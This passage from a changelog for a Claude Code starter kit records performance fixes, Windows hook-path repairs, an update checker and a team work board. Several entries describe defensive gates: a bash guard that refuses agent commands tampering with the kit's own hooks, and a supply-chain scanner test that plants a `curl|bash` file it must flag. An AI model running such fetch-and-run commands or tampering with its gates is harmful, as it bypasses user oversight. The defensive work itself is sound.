  end to end against a real GitHub remote. Commits are built with plumbing against a private index, so claiming
  never touches the working tree, index, branch or stash — you can claim mid-feature with dirty files.

  `init` probes whether the server accepts a custom ref namespace (github.com: accepted) and falls back to an
  orphan branch when one refuses; a teammate who never ran the probe resolves that fallback themselves.

  **Two gates, both no-ops in a repo that never ran `init`.** The first file edit is refused while you hold no
  item — catching unclaimed work at commit time means the duplicate already exists. A commit then names an item
  you hold (`[#3]`) or declares itself item-less (`[chore]`). `/board-csk off` releases all three for a repo,
  `--global` for every repo, `CSK_NO_BOARD=1` for one session; a switch that released two gates of three would
  be a trap.

  **Decisions travel too.** `adr` writes to `docs/adr/`, which installs gitignore, so an architectural record
  reached the machine that made it and nobody else — the thing this board exists for, one level above an item.
  Decisions now live beside the items and travel with them, including when the board is a separate repository.
  An unread one announces itself at the next session opening, names itself, and goes quiet once read.

  **Starting work asks what everyone else is doing.** Claiming an item prints what each dependency actually
  delivered, names who is waiting on it, lists what teammates are mid-flight on right now, and surfaces
  decisions you have not read — because the dependency graph only knows the edges somebody declared, and a
  decision announced only at session start arrives too late for an item claimed an hour in.

  Setup is one command for one person (`/board-csk init`, or `--remote <url>` for a separate board repository);
  everybody else configures nothing and the board reaches them on their own.

  Gated by 30+ behavioural assertions in `smoke-test` — the multi-clone race, dependency block and unblock, a
  drop that refuses an empty note, the commit gate in four states, the write gate in five, a server that denies
  custom refs, a board in a separate repository, decisions reaching a second clone and going quiet once read, a
  status view that cannot contradict itself or serve a stale answer, and the no-board regression path that keeps
  every existing project exactly as it was.

### Fixed
- `guard-bash.sh`'s gate-tamper patterns spanned the whole command line, so a writer verb in one command and a
  gate path in another was refused as tampering — `cp a b && bash .claude/hooks/board.sh status`, blocked. That
  fault predates this release and was harmless while nobody typed a hook path; the board made one an everyday
  argument. Scoped to a single command segment: nine attack shapes still refused, five false positives released.

## [2.2.2] - 2026-08-10

### Performance
- **A corporate Windows machine spent seconds of every turn re-measuring something it had just measured.**
  Reported as "clean session, first command, minutes of silence", and measured on the machine that reported it
  rather than guessed — on macOS a wasteful hook and a lean one both read 0s. There: an empty `bash` startup
  costs **263 ms** and an empty external command **298 ms**, against ~5 ms and ~2 ms on Linux. Process creation
  is 60-100x slower, an enterprise scanner inspecting every spawn, and no amount of shell tuning undoes that.
  What is ours is how many processes we ask for.

  `session-guard.sh` ran `bash context-usage.sh --verbose` as a child at the end of **every turn** — a second
  shell startup and a second full transcript scan, to recompute a figure the same script had produced one hook
  earlier in the same turn. `context-usage.sh` now publishes its reading to a session-keyed file and the Stop
  hook reads it with `$(<file)` and word splitting: no `cat`, no `sed`, no nested shell. Its two threshold `awk`
  calls became shell arithmetic on the integer part — exactly equivalent for whole-number thresholds, and it
  drops the locale hazard those calls existed to pin down. The session id is lifted out of the payload with
  parameter expansion instead of `printf | sed | head | tr`, validated rather than trusted because it becomes a
  filename.

  | | before | after |
  |:--|--:|--:|
  | `session-guard` per turn end | ~29 processes | **14** |
  | `context-usage` per prompt (installed) | 17 | **14** |
  | `context-usage` per prompt (plugin edition) | 12 | **12** |

  About **18 processes a turn** on an install — roughly five seconds a turn on the reporting machine.

  The honest cost: the published reading is taken at the *start* of the turn, so it excludes that turn's own
  output and can cross a threshold one turn later than a fresh measurement. For a warning that never blocks that
  is a good trade, and it is not silent — a missing or unreadable file falls back to measuring properly.

  Gated: the seventeen existing stop-hook assertions all exercise the slow path and still pass; four new ones
  cover the fast path — same verdict as the measured path, both paths speak at the same fill, a corrupt cache
  falls back to measuring rather than to silence, and no nested shell starts when a reading is available. The
  session id parse is checked on three payload shapes, because a mis-parsed id would not crash: it would write
  the cache under one name, read it under another, and the only symptom would be a hook that quietly stayed slow.

  Not fixed here, and larger: session start still runs three separate hooks, the prompt two, and each Bash tool
  call two more — one shell startup each. On a machine like the one above, the biggest single lever is not ours
  at all: an antivirus exclusion for the Git install, the project directory and `~/.claude`.

## [2.2.1] - 2026-08-07

### Fixed
- **The real reason an update looked hung: the supply-chain scanner, 8m07s for 64 files.** 2.2.0 cut adopt.sh's own
  spawns from 631 to 78 and the update was still minutes long, because the cost was never in adopt.sh's own trace:
  `scan-skill.sh` runs as a child `bash`, and it spawned **four greps per file**. Measured on the reporting
  machine: `git status` 3.0s · the detection `find` 0.5s · copying the whole payload 2.3s · **`scan-skill.sh`
  8m07s**, of which 12.6s is user time and 2m46s kernel — process creation, not regex work.

  grep takes many files at once and `-cH` reports a count for each, so the same engine, the same `-i` semantics and
  the same per-file line counts now come back in **4 processes instead of 244**. Output was diffed against the old
  implementation on a fixture covering all three verdicts (SAFE / REVIEW / DANGER): byte-identical, exit code
  included. Deliberately not rewritten in awk — the patterns carry intervals whose behaviour would have to be
  re-proved against another engine, and the win here is process count, not matching speed.

  That diff earned its keep: the first batched draft filled its count arrays inside a command substitution — a
  subshell — so every file scored a spotless 100 and the scanner passed everything. Caught before shipping.

- **New gate `smoke-test §7w`, and it asserts BOTH halves.** Budget 12 greps (the old code scores 124 on the same
  fixture and fails), plus a planted `curl|bash` file that must still come back DANGER with exit 1 — because a
  scanner can also get fast by no longer looking, which is exactly what the subshell bug did. Proven in both
  regression states. `§7x` could not have caught any of this: it traces adopt.sh, and the scanner's spawns are in
  a child process, which is how 244 of them hid behind a tidy 78.

## [2.2.0] - 2026-08-07

### Changed
- **`sonarqube-check` stopped claiming a verdict it never produced.** The skill told you to install a local
  analyzer and read a clean build as **0 Bugs / 0 Vulnerabilities / 0 Hotspots / 0 Code Smells**. Those are not the
  same measurement, and the gap is structural, not incidental: security-injection (taint) rules run only on
  SonarQube Server/Cloud commercial editions; Security Hotspot *review state* is a server-side status; coverage and
  duplication are not computed by a build at all; a compiler-bound analyzer never sees the JS/TS, HTML, CSS, XML,
  YAML, Dockerfile or SQL in the same repo; and it applies its own default rules, not the project's Quality
  Profile. So the kit reported "clean" while the real report carried findings — repeatedly, to a user who had
  been recommending the feature on the strength of that claim.

  It now works the other way round: **an analysis is produced, then read.** A project's own SonarQube is used if it
  has one; otherwise the skill stands one up locally — Docker (`sonarqube:community`) **or**, with no Docker, the
  plain server zip on Java 17/21 with the embedded database. Free, no licence key, no company server, and the
  token is generated locally. Findings are pulled by `ruleId + file + line`, fixed one rule at a time by the domain
  owner, and then **re-scanned**: the deliverable is the before → after diff, not "it should be clean now". That
  missing loop is why fixes appeared to be applied and the next report still had findings.

  Where nothing can be run at all, the skill says so in words instead of a rating, and lists what stays unverified.
  Its own blind spot is stated too: Community Build has no taint analysis, so injection risk is reported separately
  via `security-scan` / `threat-model`, never folded into a green gate.

  Also language-agnostic now, as the kit requires of anything shipped to every profile: the old text said "For
  .NET — the case here" and put a C# snippet in the middle of the method. SonarQube covers 20+ languages; the
  scanner table now carries one row per stack and assumes none.

- **The discipline made the same substitution, in one line, in every project.** `Definition of Done` read "a local
  analyzer is 0/0/0/0". It now reads: build clean **and** a real analysis clean — a green linter is a pre-check,
  not a verdict; no analysis, no rating.

### Fixed
- **An update took 6m43s on Windows and was repeatedly mistaken for a hang.** Reported as "`/update-csk` never
  works": an agent ran the documented command, saw nothing move for 240s, declared it stuck and killed it — while
  the process was in fact still working (it had already completed once, unnoticed, which is why the version was
  found to be current later). Measured on the user's machine: `npx` itself accounts for **6.7s**; `adopt.sh` for
  **6m43s**, of which 66s is kernel time — the signature of process spawns, not file I/O.

  The cause is the shape this project has hit before: per-item shell loops. `copy_noclobber` ran
  `dirname` + `mkdir` + `cp` for every payload file; project-skill detection ran `basename $(dirname …)` per skill;
  and the PROOF-5 stale-reference check ran `grep|cut|tr|sed` per (agent × document) pair — **the identical loop
  already converted to awk in `doctor.sh` in 2.0.1, left behind in `adopt.sh`**. Git Bash pays 20-50ms per process
  where Linux pays ~1.7ms, so none of it shows up on a maintainer's machine.

  A refresh is now one `cp -R` instead of one `cp` per file, the detection loops use parameter expansion, and
  PROOF-5 is two awk passes whose output was diffed against the old implementation on a fixture carrying both
  stale categories across two documents: **byte-identical**, line numbers and ordering included. External commands
  per update: **631 → 78**.

  The two detection `find`s also **prune** `bin`/`obj`/`node_modules`/`.git`/`.vs`/`packages` instead of walking
  them and discarding the results afterwards — on a real .NET repo that is tens of thousands of Defender-scanned
  directory entries per run.

- **New gate: `smoke-test §7x` measures the cost of an update.** Budget 200 external commands; the pre-fix code
  scores 618 and fails it. Proven in three states — regression fails, the current code passes at 78, and a fixture
  that fails to run the work fails too rather than reporting a suspiciously cheap number. That third case is not
  hypothetical: the first version of this gate reported "1 external command" and **passed**, because the fixture
  had left `adopt.sh` without its payload. It also asserts the kit repo survived the run: an earlier version
  invoked `start.sh` in place, and start.sh removes the payload next to itself — which deleted `claude-starter/`
  out of this repository mid-session. The installer is copied to a stage first now, exactly as `e2e.sh` does.

## [2.1.0] - 2026-08-07

### Added
- **`session-update-check.sh` — a published release now finds the project, instead of waiting to be remembered.**
  Until now a fix reached an install only when somebody thought to run `/update-csk`, so shipped fixes sat unused in
  the projects that wanted them. At session start the hook says, once, that a newer version is out and points at
  `/update-csk`.

  The design constraint is the whole feature: **no network I/O in the foreground.** A `SessionStart` hook blocks the
  session until it returns and its timeout is 60s, so a version lookup behind a corporate proxy or on an offline
  machine would turn session opening into a hang — the 2.0.1 failure again, from a different cause. The foreground
  reads one cache file and exits; when that cache is older than a day it starts a **detached** refresher whose
  result is used by the *next* session. A version notice is not urgent, so being one session late costs nothing
  and blocking would cost everything. If the refresher is killed the next startup simply retries: the worst case
  is a late notice, never a hang and never a wrong version.

  Wired on `startup` alone — on resume/clear/compact it would re-announce inside one session, on the same channel
  that carries the rehydrate and trust notices. Announced once per released version, so declining an update is not
  re-litigated every morning. `CSK_NO_UPDATE_CHECK=1` turns it off; an outbound request nobody asked for needs a
  switch, not a justification. `/doctor-csk` reports the same cached answer, so a missed notice is still findable —
  and it makes no network call of its own either.

  **Both editions, each told by the channel that will deliver the release.** A project install compares
  `.claude/VERSION` against the npm dist-tag and points at `/update-csk`; a plugin install compares its own
  `.claude-plugin/plugin.json` against the marketplace repo's copy — the number `claude plugin update` will
  actually bring — and points at that command. The plugin's cache is user-level (`$XDG_CACHE_HOME`), the one
  place the kit's "everything stays inside the repo" rule cannot apply, because a plugin install is not inside
  one. With both present the project install wins, so one release is never announced twice.

  This nearly shipped as installer-only, on the assumption that a plugin has no version to compare against. It
  has one — its own manifest — and the assumption would have left an entire distribution channel out of the
  feature. Four cases now hold that shut, including the precedence rule.

  The published version is treated as untrusted input on its way into a model's context: digits and dots, exactly
  three fields, or it is discarded unread. **That check was measured, not assumed** — the first version of its test
  used `not-a-version` as the fixture and stayed green with the sanitiser deleted, because the numeric comparison
  rejected it first. The fixture is now `9.9.9-<text>`, which *wins* the comparison, so only the shape check can
  stop it. All four sabotages (foreground lookup · undetached refresher · no shape check · no once-per-version
  suppression) were run against the gate and each one fails it.

### Fixed
- **Both READMEs said "8 hooks" while the directory held nine and their own table listed nine.** Every hook was
  individually documented — that gate has existed since the table was written — but the *number* beside it was a
  separate claim nobody checked, and a reader takes "All 8 hooks" as the total without counting rows. Same class as
  the diagram that drew eleven of twelve agents and the site stuck on an old version. Corrected to ten and gated:
  the count is derived from `hooks/*.sh` and asserted in both places, in both languages.

## [2.0.2] - 2026-08-07

### Fixed
- **No hook launched at all on Windows, and every gate was silently absent.** Reported as
  `bash: C:Reposapp/.claude/hooks/session-rehydrate.sh: No such file or directory` —
  note the separators are **deleted**, not converted. The installed `settings.json` was correct, and no local
  reproduction could produce that string, which is what finally located the cause: hooks were wired in **shell
  form** with the project path interpolated into the command, and Claude Code substitutes the placeholder into
  that string *before* a shell ever sees it. On Windows the value is `C:\Repos\app`, and the backslashes are
  consumed on the way. 2.0.1's `${VAR//\\//}` fold could never have run — bash was not the one doing the
  expanding.

  Hook commands now carry **no placeholder at all**:

  ```
  cd "$CLAUDE_PROJECT_DIR" 2>/dev/null; bash .claude/hooks/<name>.sh
  ```

  Hooks run in the project directory, so the relative path is the load-bearing part and there is nothing left for
  the substitution to mangle. The `cd` is a belt for a session started in a subdirectory; it uses the **bare**
  `$CLAUDE_PROJECT_DIR`, which is not the placeholder syntax and therefore survives to the shell, and if it fails
  the relative path still carries.

  **The documented fix was tried first and rejected on evidence.** The hooks reference recommends *exec form*
  (`"command": "bash", "args": [...]`) for anything referencing a path placeholder, and it was implemented —
  then checked on the affected Windows machine before shipping. `where bash` there answered
  `C:\Windows\System32\bash.exe`: not Git Bash, but the **WSL launcher**, whose filesystem namespace has no
  `C:\Repos\app` at all. Exec form spawns `command` off the PATH with no shell, so it would have run that — or
  failed outright on a machine without WSL — and taken every gate with it, with an error pointing nowhere near
  the cause. It would have been a worse bug than the one being fixed, shipped as the recommended solution.
  `smoke-test.sh` now refuses exec-form wiring outright, with that reasoning attached.

  `doctor.sh` reports `${CLAUDE_PROJECT_DIR}` in a hook command as a failure on every platform — a repo is shared
  across machines, and the wiring is wrong on all of them the moment one teammate is on Windows.

  Handled alongside: every non-gate hook was checked to exit 0 on its hook path (`context-usage.sh` had a second
  non-zero exit that would surface as a per-turn error banner), and `adopt.sh`'s merge now recognises kit hooks
  from `command` *and* `args`, so it tolerates either wiring shape on an update.
- **Every path the kit read out of a hook payload was broken on Windows.** Hook stdin is JSON, and JSON encodes a
  backslash as two — so the real path `C:\Users\me\.claude\projects\p\a.jsonl` arrives as
  `C:\\Users\\me\\...`. The kit sliced that value out with `sed` and used it verbatim, which names no file on any
  platform. `context-usage.sh` therefore reported `transcript not found` on **every turn**, on Windows CLI and in
  Claude Desktop alike, and it read like the hook was being invoked without stdin. It was being invoked correctly
  and then discarding the answer. Paths coming out of the payload are now JSON-decoded before use.

  Scope, honestly: only `context-usage.sh` was actually broken. `session-rehydrate.sh` and `skill-trust.sh` folded
  lone backslashes in 2.0.1, and folding both halves of a `\\` yields `//`, which the OS collapses — they survived
  the encoded form by accident. Both now decode explicitly, and all three are pinned by a suite case that feeds
  the real hooks a Windows-shaped payload.
- **`context-usage.sh` no longer exits non-zero when it cannot measure — as a hook.** Nothing downstream reads the
  status (`session-guard.sh` parses the line and falls open without it), while a non-zero hook exit is a visible
  error in the user's session once per turn, for a condition the discipline already handles. Called by hand with a
  bad path it still complains and exits 1, because that is a person's mistake and worth saying out loud.

### Added
- **A stale-WIRING gate: a session resumed across a kit update runs the previous hooks.** Found while verifying
  the path fix on the affected machine — `settings.json` on disk had already been corrected and `--resume` still
  produced the error naming the old, mangled path, while the same event in a fresh session was clean. So
  `--resume` carries the wiring the session started with, and on the very release that repairs the Windows path
  that means the gates in force are still the broken ones.

  The obvious gate is impossible: a hook cannot report its own absence, and under the old wiring on Windows no
  hook launched at all. This catches the other half — hooks that *do* run, but not the way the file on disk says
  they should. `$0` is the evidence: the kit wires `bash .claude/hooks/<name>.sh`, so a correctly-launched hook
  sees a relative `$0`, and anything else came from a different `settings.json`. It stays silent when
  `settings.json` is absent or hand-rewired: a project that wired its own hooks is not wrong, and warning it every
  turn about something it chose is noise it cannot act on.
- **`eval/preflight.sh` — the toolchain gaps get named before they become symptoms.** Runs inside `start.sh` and
  `adopt.sh` (before the confirm prompt) and inside `doctor.sh` (because the machine changes after install day).
  The kit is written to degrade rather than break — no `jq` falls back to `python`, then to plain bash; no
  `sha256sum` falls back to `cksum` — which is correct design and exactly why a missing tool never announces
  itself. Every surprise in this project came from that silence. Preflight names the gap and what it costs.

  It **reports and never installs**. A scaffolding tool that puts software on someone's workstation unasked is a
  worse problem than the one it solves, and on a managed corporate machine it just fails in a new way.

### Note
- **What is verified, and by what.** The script layer is covered on real Git Bash by the `windows-latest` CI leg:
  JSON-escaped payload paths decode, the wiring carries no placeholder, exec form is refused, the CRLF manifest
  resolves, `route-hint` costs 2s for ten prompts. The wiring fix itself was confirmed on the affected machine by
  the reporting user — same machine, same `SessionStart:clear` event, old wiring errored and the new wiring was
  clean.

  What no CI can show is whether Claude Code launches the hooks across a **full install**, because the suite runs
  the scripts directly rather than through the hook mechanism. That end-to-end pass is outstanding at release
  time. It is written down rather than glossed: the previous release shipped on the assumption that a green suite
  meant a working install, and the user's machine said otherwise.

- **Three gates in this release were wrong before they were right**, each caught by the platform it was written
  for. The CRLF case passed against the broken code because it called `--trust` first, which accepted the
  falsely-flagged components and silenced the very output it asserted on. The Windows-payload fixture then failed
  on `windows-latest` twice: first because it assumed POSIX separators where `TMPDIR` is native, then because its
  encoder emitted four backslashes per separator instead of two — which decodes to `//`, collapsed by POSIX and
  read as a UNC path by Windows. In all three the measurement was broken, not the code under it. New cases now
  carry a check on their own fixture, and the encoder exists once rather than twice.

## [2.0.1] - 2026-08-06

### Fixed
- **The kit froze Claude Code on Windows, once per prompt.** `route-hint.sh` runs on every `UserPromptSubmit`,
  and it scored the payload with nested shell loops: for each of the ~50 component files a `grep`+`head`+`sed`,
  and for each of their 348 trigger phrases a `sed|tr|sed` normalisation plus a `printf|grep` with another `sed`
  nested inside the pattern. That is roughly **2,000 process spawns per prompt** for work that is substring
  matching over a few KB of text — measured at **3.35s on an M-series Mac**, 104% CPU, essentially all of it fork
  overhead.

  On macOS and Linux that is merely wasteful. On Windows it is fatal: Git Bash has no real `fork()`, so every
  process is a `CreateProcess` plus the MSYS2 emulation layer plus whatever the AV scanner charges — 20-50ms
  instead of 1.7ms. The same 2,000 spawns land at **40-100 seconds** against a 10s hook timeout. Claude Code
  blocks on a hook until its timeout expires and then discards the output, so the session paid the full stall on
  every single prompt **and** lost the routing it was stalling for. Reported as "the kit hangs Claude Code and no
  command works"; it was never a Claude Code bug, the kit was spending the budget.

  Matching is now one `awk` pass with the normalisation done inside awk. External processes per prompt: ~2,000 →
  **4**. Cost per prompt: 3.35s → **0.027s**. A differential run over 24 prompts (Turkish and English, every
  domain, plus the silence cases) shows **zero behavioural difference**, and `smoke-test.sh` §7y pins the
  semantics as before.
- **`doctor.sh` looked hung on Windows.** Its agent-reference check ran a `sed|head|tr` per installed agent and
  then a `grep|cut|tr|sed` for every (agent × scanned document) pair — ~250 process spawns for a check that reads
  a handful of markdown files. On Git Bash that stopped dead partway through the report, and the user running it
  reasonably read that as a hang. Now two `awk` passes, whatever the component count; the report is byte-identical,
  including line numbers and ordering.

- **`skill-trust.sh` declared the entire payload unvetted when the manifest had CRLF line endings.** It matched
  components with `grep -qxF "skills/handoff"`, which does not match the line `skills/handoff\r` — so on Windows
  every kit component read as unshipped and the session opened with a wall of warnings about the kit's own files.
  That is worse than noise: it teaches the reader to skip the one warning that will eventually matter. CRLF gets
  in whenever `.claude/` is committed and checked out under `core.autocrlf=true`, which is precisely the shared-kit
  setup this gate exists for. Found while cutting the same function's spawn count — the per-component
  `basename` + `grep` pair (50 components, **100 spawns**, every session start, normally to report nothing) is now
  a single builtin read and a shell pattern match: **0 spawns**.

  Measured spawn counts per invocation after this release, for the paths that run on a timer users feel:
  `route-hint.sh` **3,043 → 4** (per prompt), `doctor.sh` ~250 → ~40, `skill-trust.sh` **100 → 0** (per session),
  `context-usage.sh` 9 (per prompt), `guard-bash.sh` 29 (per Bash tool call), `session-guard.sh` 9 (per turn).
- **Hook paths did not resolve on Windows.** `${CLAUDE_PROJECT_DIR}` and `${CLAUDE_PLUGIN_ROOT}` arrive as native
  paths there (`C:\Repos\app`), and every hook invocation pasted a POSIX segment onto one — producing
  `C:\Repos\app/.claude/hooks/guard-bash.sh`, a shape Git Bash does not reliably resolve, so the gate reported a
  path it could not find. All 15 invocations in `settings.json` and the plugin's `hooks.json`, plus the `ROOT`
  resolution inside `session-rehydrate.sh` and `skill-trust.sh`, now fold backslashes to forward slashes. Verified
  as a no-op on POSIX paths (including paths carrying spaces and dots) down to bash 3.2.

### Changed
- **Hook timeouts are 60s across the board** (were 10-60s). A timeout is a ceiling, not a cost: it does not slow
  anything down, it stops a hook being killed mid-work on a slow machine — which on Windows is the normal case,
  not the edge case.
- **The settings-merge assertions read the expected timeout from the kit instead of pinning `30`.** Four of them
  (one in `smoke-test.sh`, three in `e2e.sh`) hard-coded the number, so retuning the timeouts turned a correct
  merge red and blamed the merge for it — the same stale-literal failure the SessionStart assertion next door was
  already written to avoid. The stale fixture still carries `10`, and a guard now refuses to run the assertions at
  all if the kit ever ships that same value, so the test cannot quietly stop proving anything.

### Added
- **A cost gate for `doctor.sh`** (`e2e.sh`, 20s bound). It lives in the e2e rather than the smoke-test because
  that job also runs on `windows-latest` — the only place in CI where a process spawn costs a real Git Bash user
  what it actually costs. A healthy run is ~2-4s there; a per-pair fork loop is 10s+.
- **A cost gate for `route-hint.sh`** (`smoke-test.sh` §7y): ten prompts through the hook must finish within 5s.
  Correctness tests could not see this class of bug — the hook answered correctly, just far too slowly — so the
  budget needed a gate of its own. The bound sits an order of magnitude above the current implementation (~0.3s)
  and an order of magnitude below the one it replaced (34s), so it catches a fork explosion without tripping on a
  slow CI box. Verified failing on the old implementation before being relied on.

### Note
- Both fixes are reasoned from the mechanism and measured on macOS; the Windows leg is **not** verified on
  Windows hardware by this project. The freeze fix is arithmetic and holds on any platform. The path fix is a
  strict improvement — forward slashes work everywhere — but if a hook path error survives it, the exact error
  text is what will close it.

## [2.0.0] - 2026-08-03

### Changed
- **BREAKING — one install shape.** `start.sh` no longer asks for a project profile. Every install ships all 12
  agents and all 38 skills; the wizard is two steps (backend pattern → summary), and `claude-starter/profiles.conf`
  is gone. The `--backend` / `--frontend` / `--mobile` / `--fullstack` flags are accepted and ignored, with a
  notice, so an existing command line still installs — it just installs everything.

  The split was sold as a way to spend less context. Measured against the payload: the widest pruning saves
  **1,467 bytes ≈ 367 tokens** (`--backend`), 1,615 ≈ 404 (`--frontend`), 1,437 ≈ 359 (`--mobile`) — against a
  13,267-byte total, and ~0.2% of a 200k window. The one argument that could have justified it, Claude Code's
  1%-of-context skill **listing budget**, was already answered by `skillListingBudgetFraction: 0.04` shipped in
  1.10.0; pruning four skills never brought a 7,208-character listing under a 2,000-character budget. The ledger
  on the other side is concrete and in this changelog: a sleeping agent on `--generic`, route-hint cases that
  failed on every pruned profile, and an e2e matrix that took 77 of a 89-minute Windows job. `adopt.sh` never
  pruned by profile and the plugin edition never had profiles at all — so two of three channels already shipped
  the full set, and the third's difference was the bug surface.

  Consequences kept deliberate: **`.NET/DevArchitecture ↔ generic` is still asked on every install** — that skill
  is genuinely wrong in a Node repo, and it remains the only component the installer removes. The DevArch layout
  (`./backend` + a reserved `./frontend`) applies to every `--dotnet` install rather than one profile.
- **`code-review-csk` stands on three layers instead of one archived repository.** google/eng-practices was
  archived read-only on 2025-11-21 and has no successor; the skill was resting its whole spine on it. The layers
  are now separated by the question each one answers. **Judgement** is the kit's own — the two-stage verdict and
  verifier integrity, which exist because the code under review is increasingly agent-written and no external
  standard covers that. **Governance** is NIST SP 800-218 **PW.7** and the OpenSSF Scorecard **Code-Review**
  check. **Comment vocabulary** is Conventional Comments. eng-practices stays attributed for what is genuinely
  adapted from it — the nine-item priority order and the "improves overall code health" bar — because CC-BY 3.0
  obliges that whether or not the repository is archived, and dropping the credit while keeping the derivation
  would be a licence violation, not a cleanup.

  Deliberately **not** adopted: the claim circulating that PW.7/PW.8 "become mandatory when AI is the author".
  That is a vendor's June 2026 proposal *to* NIST, not published NIST policy, and citing it as a standard would
  be exactly the kind of unverified claim the review skill exists to catch.

  Two capabilities came out of the re-grounding rather than the rename. **Comments carry a label**
  (`issue` · `suggestion` · `nitpick` · `question` · `todo` · `praise`, with `(blocking)`/`(non-blocking)`
  decorations) mapped onto the existing blocker/suggestion/nit split — an agent writes these and something has to
  sort them without reading each one. And **every finding now leaves the review with a disposition** — fixed,
  tracked, accepted or dropped — which PW.7.2 requires ("record and triage all discovered issues") and the skill
  had no notion of: findings were reported and then nothing. Blockers may only be fixed or tracked, and the agent
  cannot grant itself "accepted".
- **The front page was rebuilt for someone who has not used the kit.** It had grown by accretion: three dense
  paragraphs before the reader learned what the thing does, no table of contents at 364 lines, and two sections
  that explained the document instead of the product — a "claims" table followed by the same claims re-explained
  at length, and four "what it is not" negations answering objections a newcomer has not formed yet. Both are
  gone; their two real caveats moved next to what they qualify. The Turkish page was rewritten as Turkish rather
  than translated: 51 em dashes (not Turkish punctuation), "gate" as *kapı* (a door), "sandbox" as a literal
  sandpit, "slip" as skiing. One claim was dropped rather than reworded — the hero cited "0 of 24 sessions,
  39 of 48" behind a passive "Measured:", and those figures appear nowhere but this changelog. `evals/` has no
  case for them, so a reader following the claim finds nothing. The pressure-test figure, which does have a
  published table, stays.
- **The updater completes a narrower install instead of preserving it.** A project whose `kit.conf` carries a
  pre-2.0 `profile=` key gets the missing components installed, **each one named** in the output, and the key
  removed so the notice retires after one run. The list is derived from a before/after disk diff, not from a
  profile→pruned table, because that table is what was deleted. `stack=` is untouched: a `generic` project does
  not acquire `devarch-module` on the way through.

### Fixed
- **`brew install` could not have worked, and no gate could see it.** The published Homebrew formula installs
  `update.sh`. That script was renamed to `adopt.sh`, and `make-release.sh` restricts the tarball to
  `start.sh`, `adopt.sh`, `claude-starter/` and `VERSION` — so the formula has been naming a file the release
  archive cannot contain. It survived because the release step rewrote only `url`, `sha256` and `version` in
  the tap's copy and never touched its install logic, while the correct formula sitting in
  `packaging/homebrew/` was read by nothing: zero references anywhere in the repo. The release now publishes
  this repo's formula and fills the three release-specific fields into it, so install logic reaches users.
  Two gates: the formula may only install files that exist here, and the release must copy rather than patch.
  The already-published tap stays broken until the next release rewrites it.
- **The npm wrapper's `--help` advertised flags the installer no longer has.** `bin/cli.js` printed
  `[--backend|--frontend|--mobile|--fullstack]` as the primary usage form, and described an update as
  refreshing "the shape it was installed in". A user reads `--help` before the README. Both corrected, and a
  gate fails if the profile flags reappear as the documented form.
- **A shipped hook was documented nowhere.** `session-stats.sh` is on disk and two skills call it, but the
  rewritten README dropped it, and the claim that the plugin edition ships "these gate hooks too" was wrong —
  `skill-trust.sh` is deliberately excluded there, because it decides kit-owned from a manifest only an
  installer writes. Both corrected. Two gates: every hook must be documented in both READMEs, and the plugin's
  wired set may differ from `settings.json` by exactly that one documented exclusion. This is the fourth
  hand-maintained list in this release found to have drifted from what it describes.
- **An installer assertion in `e2e.sh` failed with nothing to read.** The adopt run it depended on went to
  `/dev/null`, so a red CI could not distinguish a defect from a flake. Adopt-dependent assertions now keep the
  output and exit code and print the state they ran against — `kit.conf`, component counts, the branch, and the
  two signals the stack detector reads. Verified by breaking a fixture deliberately. No retry was added: the
  failure did not reproduce in eight local runs, passed on the neighbouring commits and on the other two
  runners, and burying an intermittent failure is worse than leaving it loud. Its cause is still unknown.
- **A gate that took three other gates down with it when its subject was deleted.** Every assertion in
  `smoke-test §6e` — including the README agent-count check and the EN/TR structural parity check added earlier
  in this release — sat inside `if [ -f profiles.conf ]`. Removing that file did not turn the section red; it
  turned the section **off**, and the suite reported PASSED. The replacements are inverse and unconditional
  (`profiles.conf` must not exist; neither installer may carry prune code; `kit.conf` must not carry `profile=`),
  and the count check now asserts that `start.sh` derives its numbers from the payload rather than printing a
  literal. Proved by injection in six directions, each one red before the fix and green after.
- **Two routing suites absorbed a missing component instead of reporting it.** `routing-eval` skipped any target
  it could not find and `§7y` printed a note for an uninstalled agent — correct while profiles pruned them, and a
  blindfold once every install ships everything. Both now fail; `devarch-module` on a generic backend is the one
  remaining legitimate skip. `routing-eval` reports **0 skipped** on a full payload.
- **The two channels could ship different component sets with nothing comparing them.** `e2e.sh` now diffs an
  installed `.claude/` against the plugin edition and fails on any divergence — the class that produced the
  sleeping generic agent above. The rehearsal drops from six profile combinations to two backend patterns plus a
  legacy-flag case, and asserts the component counts instead of printing them.
- **A `--generic` install shipped a backend owner that never woke up — and two gates were looking the other
  way.** On a non-.NET stack the installer swaps in `agents-optional/backend-expert-generic.md`, whose
  description read "Writes and edits … *Kicks in for* new backend features" against the .NET variant's
  "**Use proactively — owns server behaviour** … whatever its size or wording". That missing cue is precisely
  the defect 1.5.0 diagnosed as agents sleeping, still live on the generic path.
  It survived because the suite answered two questions by DIRECTORY rather than by fact:
  - `agents-optional/` was reached by exactly one of nine agent checks (routing parity). The other eight —
    frontmatter, skill references, Trigger phrases, the delegation cue — iterate `agents/` only, so a file the
    installer *moves into* `agents/` was ungated in the repo it ships from.
  - In an install the file IS scanned, and the escape hatch meant for a project's own components excused it:
    `✅ some agents lack a proactive cue: backend-expert-csk (your project's own agents, not gated)`. It is a
    kit agent. `.claude/kit-manifest.txt` has recorded exactly that distinction since 1.8.0 and none of the
    four hatches consulted it.

  Both are fixed at the root. `agent_quality_files()` widens the five checks that judge a file's own quality,
  and deliberately not the three that reason about the installed set (agent count, always-on byte budget,
  orphan routing) — a swap-in replaces its counterpart rather than adding to it. `kit_owned()` makes the four
  hatches ask the manifest instead of the context; with no manifest they stay lenient, because absence of
  evidence is not ownership. Verified on a live `--generic` install in three directions: a kit-owned component
  that regresses now fails, a user's own agent is still only noted, and the generic variant passes once its
  description carries the cue.
- **Nothing compared the two READMEs, so an edit reached one language and shipped.** `README.md` received a
  corrected claim and a whole "Honest scope" blockquote that never reached `README.tr.md`, and every gate
  stayed green — only the skill catalogue and the agent count had ever been compared. `smoke-test` now checks
  structural parity: the heading-level sequence, table rows, code fences, and blockquote **blocks** (blocks,
  not lines — Turkish wraps longer). It reproduces the real divergence as `14` blocks against `13`.
- **`vps-deploy` runtime detection covered four runtimes and singled one out in prose.** The heuristic knew
  docker/node/python/go; .NET was absent from it but got a bespoke sentence, and Java, Rust, Ruby and PHP got
  neither. Detection now covers eight, the release-artefact step names each runtime's own command, and no
  runtime is privileged in prose.
- **The README claimed breaking a critical rule was "impossible" — the guard script says "defence-in-depth".**
  The kit's own source contradicted its front page, and for a security-adjacent audience an overclaim that is
  found is worse than a modest one. Both languages now state the real scope: the gate answers before the
